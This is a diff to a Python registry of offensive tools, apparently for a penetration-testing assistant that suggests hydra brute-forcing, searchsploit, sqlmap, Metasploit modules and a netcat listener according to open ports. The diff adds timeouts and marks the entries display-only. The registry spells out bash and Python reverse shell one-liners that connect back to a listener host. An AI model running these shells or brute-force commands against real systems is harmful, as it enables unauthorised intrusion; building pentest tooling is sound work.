@@ -17,6 +17,7 @@ _TOOL_REGISTRY: list[Tool] = [
         command_template="hydra -L {userlist} -P {passlist} {target} {service}",
         description="Credential brute-force — specify wordlist paths",
         requires_input=["userlist", "passlist", "service"],
+        timeout=300,
     ),
     Tool(
         id="searchsploit_mirror",
@@ -24,6 +25,7 @@ _TOOL_REGISTRY: list[Tool] = [
         command_template="searchsploit -m {exploit_id}",
         description="Copy a public exploit script to the current directory",
         requires_input=["exploit_id"],
+        timeout=10,
     ),
     Tool(
         id="sqlmap",
@@ -33,15 +35,17 @@ _TOOL_REGISTRY: list[Tool] = [
         optional=True,
         condition="port_web",
         requires_input=["url"],
+        timeout=300,
     ),
     Tool(
         id="reverse_shell_bash",
         label="Reverse shell (bash)",
         command_template="bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'",
-        description="One-liner bash reverse shell — run on target after gaining execution",
+        description="One-liner bash reverse shell — displays command to run on target",
         optional=True,
         condition="port_web",
         requires_input=["lhost", "lport"],
+        display_only=True,
     ),
     Tool(
         id="reverse_shell_python",
@@ -52,10 +56,11 @@ _TOOL_REGISTRY: list[Tool] = [
             "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
             "subprocess.call([\"/bin/sh\",\"-i\"])'"
         ),
-        description="Python3 reverse shell — useful when bash is restricted",
+        description="Python3 reverse shell — displays command to run on target",
         optional=True,
         condition="port_web",
         requires_input=["lhost", "lport"],
+        display_only=True,
     ),
     Tool(
         id="nc_listener",
@@ -72,6 +77,7 @@ _TOOL_REGISTRY: list[Tool] = [
         optional=True,
         condition="port_web",
         requires_input=["path", "cmd"],
+        timeout=15,
     ),
     Tool(
         id="msf_distcc",
@@ -104,7 +110,6 @@ def get_tools(open_ports: set[int], exploit_info: dict[str, Any] | None = None) 
         if msf := _TOOL_MAP.get("msf_auto"):
             tools.append(msf)
 
-    # Service-specific MSF modules
     if open_ports & {3632}:
         if t := _TOOL_MAP.get("msf_distcc"):
             tools.append(t)
@@ -120,7 +125,6 @@ def get_tools(open_ports: set[int], exploit_info: dict[str, Any] | None = None) 
     if mirror := _TOOL_MAP.get("searchsploit_mirror"):
         tools.append(mirror)
 
-    # nc listener is always useful
     if nc := _TOOL_MAP.get("nc_listener"):
         tools.append(nc)
 
